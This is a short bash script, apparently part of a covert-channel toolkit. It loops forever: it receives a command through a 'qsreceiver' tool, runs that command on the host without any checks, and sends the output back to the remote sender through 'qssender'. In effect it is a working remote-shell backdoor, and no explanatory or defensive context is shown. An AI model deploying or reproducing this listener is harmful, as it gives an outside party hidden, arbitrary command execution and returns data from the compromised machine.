#!/bin/bash
#Usage: ./listener.sh <ip_listen>"
LISTEN=$1

while [[ 1 ]]; do
    ##Get command
    RECEIVE_OUTPUT=$(../../qsreceiver receive truncated 1 -l $LISTEN)
    REMOTE=$(echo $RECEIVE_OUTPUT | cut -d ':' -f 2 | cut -d "," -f 1 | cut -d ' ' -f 2 )
    #echo "REMOTE: $REMOTE"

    CMD=$(echo $RECEIVE_OUTPUT | rev | cut -d ':' -f 1 | rev )

    #echo $CMD

    ##Execute it
    CMD_OUTPUT=$($CMD)

    #echo $CMD_OUTPUT

    ##Return output to remote
    ../../qssender send "$CMD_OUTPUT" -d 1 -l $LISTEN -r $REMOTE -s 100 -N
done